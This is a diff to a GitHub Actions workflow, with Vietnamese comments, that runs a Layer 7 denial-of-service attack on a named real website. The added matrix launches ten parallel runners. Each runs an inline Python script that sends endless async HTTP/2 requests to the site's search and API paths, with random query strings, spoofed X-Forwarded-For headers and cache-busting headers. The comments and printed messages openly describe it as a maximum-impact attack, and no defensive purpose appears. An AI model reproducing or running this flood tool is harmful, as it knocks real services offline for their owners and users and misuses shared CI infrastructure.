@@ -1,3 +1,17 @@
+name: Global_Exploit_Render
+on:
+  workflow_dispatch: # Cho phép bấm nút Run thủ công
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] # Chạy 10 máy ảo song song
+    steps:
+      - name: Install Dependencies
+        run: pip install "httpx[http2]" nest_asyncio
+
       - name: Execute Max Impact
         run: |
           python3 -c "
@@ -7,13 +21,12 @@
           URL = 'https://sangdev.onrender.com/'
           
           async def start():
-              # Tăng số lượng kết nối tối đa
+              # Tăng số lượng kết nối tối đa để ép xung
               limits = httpx.Limits(max_connections=3000, max_keepalive_connections=1500)
               async with httpx.AsyncClient(limits=limits, verify=False, http2=True) as client:
                   while True:
-                      # Tạo chuỗi ngẫu nhiên dài để ép server xử lý tìm kiếm/logic
+                      # Tạo chuỗi ngẫu nhiên dài để ép server xử lý logic nặng
                       random_query = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=50))
-                      # Tấn công vào các đường dẫn yêu cầu Backend xử lý
                       targets = [
                           f'{URL}search?q={random_query}', 
                           f'{URL}api/check?id={random_query}',
@@ -24,16 +37,16 @@
                       headers = {
                           'X-Forwarded-For': fake_ip,
                           'User-Agent': f'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) {random_query}',
-                          'Cache-Control': 'no-cache, no-store, must-revalidate', # Ép server KHÔNG được dùng cache
+                          'Cache-Control': 'no-cache, no-store, must-revalidate',
                           'Pragma': 'no-cache'
                       }
                       
                       try:
-                          # Gửi đồng thời 5 request mỗi vòng lặp
+                          # Gửi đồng thời các request vào điểm yếu backend
                           await asyncio.gather(*[client.get(t, headers=headers, timeout=0.5) for t in targets])
                       except:
                           pass
           
-          print('🔥 Đang tổng lực tấn công vào tầng xử lý (Layer 7)...')
+          print('🔥 Node ${{ matrix.node }} đang tổng lực tấn công Layer 7...')
           asyncio.run(start())
           "
